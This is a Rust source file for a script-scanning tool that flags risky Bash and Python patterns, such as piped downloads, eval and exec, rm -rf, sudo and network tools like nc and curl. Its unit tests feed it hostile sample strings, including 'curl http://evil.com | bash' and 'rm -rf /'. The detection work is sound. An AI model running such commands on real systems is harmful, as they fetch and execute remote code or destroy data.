use crate::models::{Language, ScriptComponents, ParseMetadata};
use crate::parser::tree_sitter::{TreeSitterParser, ParseTree, ParsedNode};
use crate::parser::language::LanguageDetector;
use crate::parser::shebang::ShebangParser;
use crate::error::EbiError;
use std::time::Instant;

pub struct ComponentExtractor {
    language_detector: LanguageDetector,
}

impl ComponentExtractor {
    pub fn new() -> Self {
        Self {
            language_detector: LanguageDetector::new(),
        }
    }

    pub fn extract_from_script(
        &self,
        content: &str,
        language: Language,
    ) -> Result<ScriptComponents, EbiError> {
        let start_time = Instant::now();

        // Create parser for the detected language
        let parser = TreeSitterParser::new(language.clone())?;

        // Parse the source code into AST
        let parse_tree = parser.parse(content)?;

        // Extract components using the parser
        let mut components = parser.extract_components(&parse_tree)?;

        // Update metadata with language information
        components.metadata.language = language;

        // Add shebang information if present
        self.extract_shebang_info(content, &mut components)?;

        // Perform additional extraction based on the AST
        self.extract_ast_components(&parse_tree, &mut components)?;

        let extraction_time = start_time.elapsed();
        components.metadata.parse_time_ms += extraction_time.as_millis() as u64;

        Ok(components)
    }

    fn extract_shebang_info(
        &self,
        content: &str,
        components: &mut ScriptComponents,
    ) -> Result<(), EbiError> {
        if let Some(shebang_info) = ShebangParser::parse(content) {
            // Add shebang as a special comment
            let shebang_line = content.lines().next().unwrap_or("");
            components.add_comment(format!("SHEBANG: {}", shebang_line));

            // Check for dangerous shebang interpreters
            ShebangParser::validate_shebang(content)?;

            // Add interpreter information to metadata
            components.add_node_info(crate::models::NodeInfo {
                node_type: format!("shebang_interpreter: {}", shebang_info.interpreter),
                line_start: 1,
                line_end: 1,
                security_relevance: self.classify_shebang_security(&shebang_info.interpreter),
            });
        }

        Ok(())
    }

    fn classify_shebang_security(&self, interpreter: &str) -> crate::models::SecurityRelevance {
        use crate::models::SecurityRelevance;

        match interpreter {
            // Generally safe interpreters
            "bash" | "sh" | "zsh" | "python" | "python3" | "node" | "ruby" => SecurityRelevance::Low,

            // Environment wrapper (depends on what it's wrapping)
            "env" => SecurityRelevance::Medium,

            // Potentially dangerous
            "rm" | "dd" | "fdisk" | "mkfs" => SecurityRelevance::Critical,

            // Unknown interpreters are medium risk
            _ => SecurityRelevance::Medium,
        }
    }

    fn extract_ast_components(
        &self,
        parse_tree: &ParseTree,
        components: &mut ScriptComponents,
    ) -> Result<(), EbiError> {
        match parse_tree.language {
            Language::Bash => self.extract_bash_ast_components(&parse_tree.root_node, components),
            Language::Python => self.extract_python_ast_components(&parse_tree.root_node, components),
            Language::Unknown => Err(EbiError::UnknownLanguage),
        }
    }

    fn extract_bash_ast_components(
        &self,
        root_node: &ParsedNode,
        components: &mut ScriptComponents,
    ) -> Result<(), EbiError> {
        let lines: Vec<&str> = root_node.text.lines().collect();

        for (line_num, line) in lines.iter().enumerate() {
            let trimmed = line.trim();
            let line_number = line_num + 1;

            // Extract security-relevant patterns
            self.extract_bash_security_patterns(trimmed, line_number, components);

            // Extract network operations
            self.extract_network_operations_bash(trimmed, line_number, components);

            // Extract file operations
            self.extract_file_operations_bash(trimmed, line_number, components);

            // Extract privilege escalation patterns
            self.extract_privilege_patterns_bash(trimmed, line_number, components);
        }

        Ok(())
    }

    fn extract_python_ast_components(
        &self,
        root_node: &ParsedNode,
        components: &mut ScriptComponents,
    ) -> Result<(), EbiError> {
        let lines: Vec<&str> = root_node.text.lines().collect();

        for (line_num, line) in lines.iter().enumerate() {
            let trimmed = line.trim();
            let line_number = line_num + 1;

            // Extract security-relevant patterns
            self.extract_python_security_patterns(trimmed, line_number, components);

            // Extract dangerous imports
            self.extract_dangerous_imports_python(trimmed, line_number, components);

            // Extract exec/eval patterns
            self.extract_exec_patterns_python(trimmed, line_number, components);

            // Extract file and network operations
            self.extract_io_operations_python(trimmed, line_number, components);
        }

        Ok(())
    }

    fn extract_bash_security_patterns(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        // Command substitution patterns
        if line.contains("$(") || line.contains("`") {
            components.add_node_info(NodeInfo {
                node_type: "command_substitution".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }

        // Eval patterns
        if line.contains("eval ") {
            components.add_node_info(NodeInfo {
                node_type: "eval_statement".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }

        // Process substitution
        if line.contains("<(") || line.contains(">(") {
            components.add_node_info(NodeInfo {
                node_type: "process_substitution".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::High,
            });
        }
    }

    fn extract_network_operations_bash(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        let network_commands = ["curl", "wget", "nc", "netcat", "ssh", "scp", "rsync"];

        for cmd in &network_commands {
            if line.contains(cmd) {
                let relevance = match *cmd {
                    "ssh" | "scp" => SecurityRelevance::High,
                    "curl" | "wget" if line.contains("|") => SecurityRelevance::Critical, // Piped download
                    _ => SecurityRelevance::High,
                };

                components.add_node_info(NodeInfo {
                    node_type: format!("network_operation: {}", cmd),
                    line_start: line_number,
                    line_end: line_number,
                    security_relevance: relevance,
                });
            }
        }
    }

    fn extract_file_operations_bash(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        // Dangerous file operations
        if line.contains("rm -rf") || line.contains("rm -fr") {
            components.add_node_info(NodeInfo {
                node_type: "dangerous_file_removal".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }

        // File redirections
        if line.contains(" > ") || line.contains(" >> ") || line.contains(" < ") {
            components.add_node_info(NodeInfo {
                node_type: "file_redirection".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Medium,
            });
        }

        // Chmod operations
        if line.contains("chmod") {
            let relevance = if line.contains("777") || line.contains("+x") {
                SecurityRelevance::High
            } else {
                SecurityRelevance::Medium
            };

            components.add_node_info(NodeInfo {
                node_type: "permission_change".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: relevance,
            });
        }
    }

    fn extract_privilege_patterns_bash(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        if line.contains("sudo ") {
            components.add_node_info(NodeInfo {
                node_type: "privilege_escalation: sudo".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::High,
            });
        }

        if line.contains("su ") || line.contains("su -") {
            components.add_node_info(NodeInfo {
                node_type: "privilege_escalation: su".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::High,
            });
        }
    }

    fn extract_python_security_patterns(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        // Subprocess operations
        if line.contains("subprocess.") {
            let relevance = if line.contains("shell=True") {
                SecurityRelevance::Critical
            } else {
                SecurityRelevance::High
            };

            components.add_node_info(NodeInfo {
                node_type: "subprocess_call".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: relevance,
            });
        }

        // OS system calls
        if line.contains("os.system") {
            components.add_node_info(NodeInfo {
                node_type: "os_system_call".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }
    }

    fn extract_dangerous_imports_python(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        let dangerous_modules = [
            "os", "subprocess", "sys", "ctypes", "pickle",
            "marshal", "importlib", "__import__"
        ];

        for module in &dangerous_modules {
            if line.starts_with(&format!("import {}", module)) ||
               line.starts_with(&format!("from {} import", module)) {
                let relevance = match *module {
                    "pickle" | "marshal" | "__import__" => SecurityRelevance::Critical,
                    "os" | "subprocess" | "ctypes" => SecurityRelevance::High,
                    _ => SecurityRelevance::Medium,
                };

                components.add_node_info(NodeInfo {
                    node_type: format!("dangerous_import: {}", module),
                    line_start: line_number,
                    line_end: line_number,
                    security_relevance: relevance,
                });
            }
        }
    }

    fn extract_exec_patterns_python(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        if line.contains("exec(") {
            components.add_node_info(NodeInfo {
                node_type: "exec_statement".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }

        if line.contains("eval(") {
            components.add_node_info(NodeInfo {
                node_type: "eval_statement".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::Critical,
            });
        }

        if line.contains("compile(") {
            components.add_node_info(NodeInfo {
                node_type: "code_compilation".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: SecurityRelevance::High,
            });
        }
    }

    fn extract_io_operations_python(
        &self,
        line: &str,
        line_number: usize,
        components: &mut ScriptComponents,
    ) {
        use crate::models::{NodeInfo, SecurityRelevance};

        // File operations
        if line.contains("open(") {
            let relevance = if line.contains("'w'") || line.contains("\"w\"") ||
                             line.contains("'a'") || line.contains("\"a\"") {
                SecurityRelevance::Medium
            } else {
                SecurityRelevance::Low
            };

            components.add_node_info(NodeInfo {
                node_type: "file_operation".to_string(),
                line_start: line_number,
                line_end: line_number,
                security_relevance: relevance,
            });
        }

        // Network operations
        let network_patterns = ["urllib", "requests", "http", "socket", "ftplib"];
        for pattern in &network_patterns {
            if line.contains(pattern) {
                components.add_node_info(NodeInfo {
                    node_type: format!("network_operation: {}", pattern),
                    line_start: line_number,
                    line_end: line_number,
                    security_relevance: SecurityRelevance::High,
                });
            }
        }
    }
}

impl Default for ComponentExtractor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bash_security_extraction() {
        let extractor = ComponentExtractor::new();
        let content = "#!/bin/bash\ncurl http://evil.com | bash\nrm -rf /";

        let components = extractor.extract_from_script(content, Language::Bash).unwrap();

        let critical_nodes = components.get_critical_nodes();
        assert!(!critical_nodes.is_empty());

        // Should detect piped curl and rm -rf
        let has_dangerous_removal = critical_nodes.iter()
            .any(|node| node.node_type.contains("dangerous_file_removal"));
        assert!(has_dangerous_removal);
    }

    #[test]
    fn test_python_security_extraction() {
        let extractor = ComponentExtractor::new();
        let content = "import os\nos.system('rm -rf /')\nexec('malicious_code')";

        let components = extractor.extract_from_script(content, Language::Python).unwrap();

        let critical_nodes = components.get_critical_nodes();
        assert!(!critical_nodes.is_empty());

        // Should detect os.system and exec
        let has_exec = critical_nodes.iter()
            .any(|node| node.node_type.contains("exec_statement"));
        assert!(has_exec);
    }

    #[test]
    fn test_shebang_extraction() {
        let extractor = ComponentExtractor::new();
        let content = "#!/usr/bin/env python3\nprint('hello')";

        let components = extractor.extract_from_script(content, Language::Python).unwrap();

        // Should have shebang comment
        let has_shebang_comment = components.comments.iter()
            .any(|comment| comment.contains("SHEBANG"));
        assert!(has_shebang_comment);
    }
}